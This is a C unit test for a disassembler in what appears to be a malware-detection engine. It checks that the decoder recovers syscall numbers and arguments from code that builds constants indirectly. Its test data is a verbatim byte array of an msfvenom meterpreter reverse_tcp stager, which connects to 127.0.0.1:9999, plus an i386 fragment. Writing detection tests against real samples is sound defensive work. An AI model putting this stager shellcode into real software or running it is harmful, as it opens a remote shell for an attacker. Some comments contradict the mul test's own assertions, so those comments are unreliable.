/*
 * kdis_const - the constant map against code that writes constants the hard
 * way.
 *
 * The property under test: at every `syscall`, the map holds the number and
 * the arguments the program will actually pass. Not "a number" - the right
 * one.
 *
 * WHY THIS SHAPE OF CODE. The bytes below are a real msfvenom x86-64
 * reverse_tcp stager. Payload generators avoid NUL bytes, so they never
 * write `mov eax, imm32`; every constant arrives through an idiom instead -
 * push/pop, a register xored against itself, a byte written into the middle
 * of a register, cdq, xchg. A map that handles only `mov` reads ZERO
 * syscalls out of this file, and reads them wrong rather than absent, which
 * is worse: a wrong number resolves to a real but different capability.
 *
 * WHY A TEST AND NOT A CORPUS RUN. Four separate faults were found here by
 * hand, and every one of them was SILENT - the map answered with a number,
 * the number was wrong, and the only symptom was a sample that had matched
 * yesterday no longer matching. A corpus cannot report that, because it
 * cannot say what the file was supposed to produce. These assertions can:
 *
 *   `xor edi,edi`      a register against itself is zero whatever it held;
 *                      the map used to demand a known input and answer
 *                      "unknown" for the first instruction of the file
 *   `mov dh,0x10`      writes ONE BYTE above the low one. Folding it as a
 *                      whole-register write put 0x10 where the program put
 *                      0x1000 - the mmap length, off by a factor of 256
 *   `xchg rdi,rax`     two destinations. It used to clear the first operand
 *                      and leave the second holding the value the swap had
 *                      moved away
 *   `mul ebx`          READS its operand and writes eax:edx. Clearing the
 *                      operand instead threw away a value that survives,
 *                      and kept two that do not - see kdis_forget_written
 *
 * The file is 130 bytes and runs anywhere; nothing here touches the disk.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "../../libkofeng/kofeng.h"
#include "../../libkofeng/kofcore/kofmod/kofsig.h"
#include "../../libkofeng/analyzers/nucleo/kdis.h"

static int fails;

#define CK(cond) do { \
	if (!(cond)) { \
		printf("  FAIL %s:%d  %s\n", __FILE__, __LINE__, #cond); \
		fails++; \
	} \
} while (0)

#define EQV(reg, want) do { \
	uint64_t got_ = 0; \
	if (!kof_kdis_reg(&k, (reg), &got_)) { \
		printf("  FAIL %s:%d  reg %u unknown, wanted 0x%llx\n", \
		       __FILE__, __LINE__, (unsigned)(reg), \
		       (unsigned long long)(want)); \
		fails++; \
	} else if (got_ != (uint64_t)(want)) { \
		printf("  FAIL %s:%d  reg %u = 0x%llx, wanted 0x%llx\n", \
		       __FILE__, __LINE__, (unsigned)(reg), \
		       (unsigned long long)got_, \
		       (unsigned long long)(want)); \
		fails++; \
	} \
} while (0)

/*
 * linux/x64/meterpreter/reverse_tcp, the stage-0 stager, verbatim.
 *
 *   xor edi,edi ; push 9 ; pop rax ; cdq ; mov dh,0x10 ; mov rsi,rdx
 *   xor r9,r9 ; push 0x22 ; pop r10 ; push 7 ; pop rdx ; syscall   <- mmap
 *   ...
 *   push 0x29 ; pop rax ; cdq ; push 2 ; pop rdi ; push 1 ; pop rsi
 *   syscall                                                        <- socket
 *   xchg rdi,rax
 *   ...
 *   push 0x10 ; pop rdx ; push 0x2a ; pop rax ; syscall            <- connect
 */
static const uint8_t stager[] = {
	0x31, 0xff, 0x6a, 0x09, 0x58, 0x99, 0xb6, 0x10, 0x48, 0x89, 0xd6, 0x4d,
	0x31, 0xc9, 0x6a, 0x22, 0x41, 0x5a, 0x6a, 0x07, 0x5a, 0x0f, 0x05, 0x48,
	0x85, 0xc0, 0x78, 0x51, 0x6a, 0x0a, 0x41, 0x59, 0x50, 0x6a, 0x29, 0x58,
	0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x85, 0xc0,
	0x78, 0x3b, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x27, 0x0f, 0x7f, 0x00,
	0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58,
	0x0f, 0x05, 0x59, 0x48, 0x85, 0xc0, 0x79, 0x25, 0x49, 0xff, 0xc9, 0x74,
	0x18, 0x57, 0x6a, 0x23, 0x58, 0x6a, 0x00, 0x6a, 0x05, 0x48, 0x89, 0xe7,
	0x48, 0x31, 0xf6, 0x0f, 0x05, 0x59, 0x59, 0x5f, 0x48, 0x85, 0xc0, 0x79,
	0xc7, 0x6a, 0x3c, 0x58, 0x6a, 0x01, 0x5f, 0x0f, 0x05, 0x5e, 0x6a, 0x7e,
	0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0xed, 0xff, 0xe6
};

/*
 * `mul ebx` with ebx zeroed and then incremented - how msfvenom's i386
 * payloads set the socketcall operation. The operand is READ; eax and edx
 * are written. Kept as its own case because the x86-64 stager has no mul
 * and this is the fault that cost every i386 sample its network half.
 *
 *   xor ebx,ebx ; mul ebx ; inc ebx ; mov al,0x66
 */
static const uint8_t mulseq[] = {
	0x31, 0xdb,                 /* xor ebx,ebx */
	0xf7, 0xe3,                 /* mul ebx     */
	0x43,                       /* inc ebx     */
	0xb0, 0x66                  /* mov al,0x66 */
};

/* Step until the n-th syscall has just been decoded. Returns 0 if the walk
 * ran out first, which is a failure of the DECODER and is reported as one. */
static int to_syscall(struct kof_kdis *k, const struct kof_obj_ctx *ctx,
		      const uint8_t *buf, uint64_t n, unsigned nth)
{
	struct kdis_insn in;
	unsigned seen = 0;

	while (kof_kdis_next(k, ctx, buf, n, &in)) {
		if (in.op == KDIS_SYSCALL && ++seen == nth)
			return 1;
	}
	return 0;
}

static void ctx_x64(struct kof_obj_ctx *ctx, uint64_t n)
{
	memset(ctx, 0, sizeof *ctx);
	ctx->format = KOF_FMT_ELF;
	ctx->arch = KOF_ARCH_X86_64;
	ctx->obj_size = n;
}

/*
 * mmap(NULL, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, ...).
 *
 * The length is the one that matters: it arrives as `cdq` followed by
 * `mov dh,0x10`, so a map that writes the byte as the whole register reports
 * a 16-byte allocation. The prot is the other: 7 has both WRITE and EXEC,
 * which is what separates a stager from a JIT - see kof_flow_cap_of_syscall.
 */
static void mmap_args(void)
{
	struct kof_obj_ctx ctx;
	struct kof_kdis k;

	ctx_x64(&ctx, sizeof stager);
	memset(&k, 0, sizeof k);
	CK(kof_kdis_seek(&k, 0, 0));
	if (!to_syscall(&k, &ctx, stager, sizeof stager, 1)) {
		printf("  FAIL no first syscall decoded\n");
		fails++;
		return;
	}
	EQV(KDIS_REG_AX, 9);            /* mmap                      */
	EQV(KDIS_REG_DI, 0);            /* addr - xor edi,edi        */
	EQV(KDIS_REG_SI, 0x1000);       /* len  - cdq + mov dh,0x10  */
	EQV(KDIS_REG_DX, 7);            /* prot - PROT_W and PROT_X  */
	EQV(10, 0x22);                  /* flags - MAP_PRIVATE|ANON  */
	EQV(9, 0);                      /* offset - xor r9,r9        */
}

/* socket(AF_INET, SOCK_STREAM, 0), then the xchg that parks the descriptor. */
static void socket_args(void)
{
	struct kof_obj_ctx ctx;
	struct kof_kdis k;
	struct kdis_insn in;
	uint64_t v = 0;

	ctx_x64(&ctx, sizeof stager);
	memset(&k, 0, sizeof k);
	CK(kof_kdis_seek(&k, 0, 0));
	if (!to_syscall(&k, &ctx, stager, sizeof stager, 2)) {
		printf("  FAIL no second syscall decoded\n");
		fails++;
		return;
	}
	EQV(KDIS_REG_AX, 0x29);         /* socket   */
	EQV(KDIS_REG_DI, 2);            /* AF_INET  */
	EQV(KDIS_REG_SI, 1);            /* SOCK_STREAM */
	EQV(KDIS_REG_DX, 0);            /* protocol - cdq */

	/*
	 * `xchg rdi,rax` is the next instruction that touches either. rax
	 * held 0x29 and rdi held 2, so afterwards they are swapped - and
	 * NEITHER may keep its old value. The fault this guards against left
	 * rax reading 0x29 after the swap had moved it to rdi.
	 */
	while (kof_kdis_next(&k, &ctx, stager, sizeof stager, &in))
		if (in.op == KDIS_XCHG)
			break;
	CK(in.op == KDIS_XCHG);
	CK(!kof_kdis_reg(&k, KDIS_REG_AX, &v) || v != 0x29u);
}

/* connect(fd, &sockaddr, 16) - the length is a push/pop. */
static void connect_args(void)
{
	struct kof_obj_ctx ctx;
	struct kof_kdis k;

	ctx_x64(&ctx, sizeof stager);
	memset(&k, 0, sizeof k);
	CK(kof_kdis_seek(&k, 0, 0));
	if (!to_syscall(&k, &ctx, stager, sizeof stager, 3)) {
		printf("  FAIL no third syscall decoded\n");
		fails++;
		return;
	}
	EQV(KDIS_REG_AX, 0x2a);         /* connect */
	EQV(KDIS_REG_DX, 0x10);         /* addrlen */
}

/*
 * A SOURCE OPERAND SURVIVES THE INSTRUCTION THAT READS IT.
 *
 * After `xor ebx,ebx ; mul ebx ; inc ebx` the program has ebx = 1 and no
 * idea what is in eax or edx. The map used to have it exactly backwards.
 */
static void mul_reads_its_operand(void)
{
	struct kof_obj_ctx ctx;
	struct kof_kdis k;
	struct kdis_insn in;
	uint64_t v = 0;
	int n = 0;

	memset(&ctx, 0, sizeof ctx);
	ctx.format = KOF_FMT_ELF;
	ctx.arch = KOF_ARCH_X86;
	ctx.obj_size = sizeof mulseq;
	memset(&k, 0, sizeof k);
	CK(kof_kdis_seek(&k, 0, 0));
	while (kof_kdis_next(&k, &ctx, mulseq, sizeof mulseq, &in))
		n++;
	CK(n == 4);
	EQV(KDIS_REG_BX, 1);            /* read by mul, not written  */
	EQV(KDIS_REG_AX, 0x66);         /* mul by zero, then mov al  */
	EQV(KDIS_REG_DX, 0);            /* edx:eax = eax * 0 */
	(void)v;
}

/*
 * A BYTE WRITTEN INTO AN UNKNOWN REGISTER LEAVES IT UNKNOWN.
 *
 * The other half of the partial-write rule, and the one that keeps it
 * honest: merging into a value nobody knows produces a number that looks
 * like an answer. `mov al,0x66` above is this case - ax was clobbered by
 * mul - and it must come back unknown rather than 0x66.
 */
static void narrow_write_needs_a_base(void)
{
	static const uint8_t seq[] = {
		0x8b, 0x06,                 /* mov eax,[esi]  - unknown  */
		0xb4, 0x10                  /* mov ah,0x10               */
	};
	struct kof_obj_ctx ctx;
	struct kof_kdis k;
	struct kdis_insn in;
	uint64_t v = 0;

	memset(&ctx, 0, sizeof ctx);
	ctx.format = KOF_FMT_ELF;
	ctx.arch = KOF_ARCH_X86;
	ctx.obj_size = sizeof seq;
	memset(&k, 0, sizeof k);
	CK(kof_kdis_seek(&k, 0, 0));
	while (kof_kdis_next(&k, &ctx, seq, sizeof seq, &in))
		;
	CK(!kof_kdis_reg(&k, KDIS_REG_AX, &v));
}

int main(void)
{
	mmap_args();
	socket_args();
	connect_args();
	mul_reads_its_operand();
	narrow_write_needs_a_base();

	printf("kdis constants: push/pop, xor-self, cdq, byte-into-register, "
	       "xchg, mul reads its operand%s\n", fails ? "" : " - ok");
	return fails != 0;
}
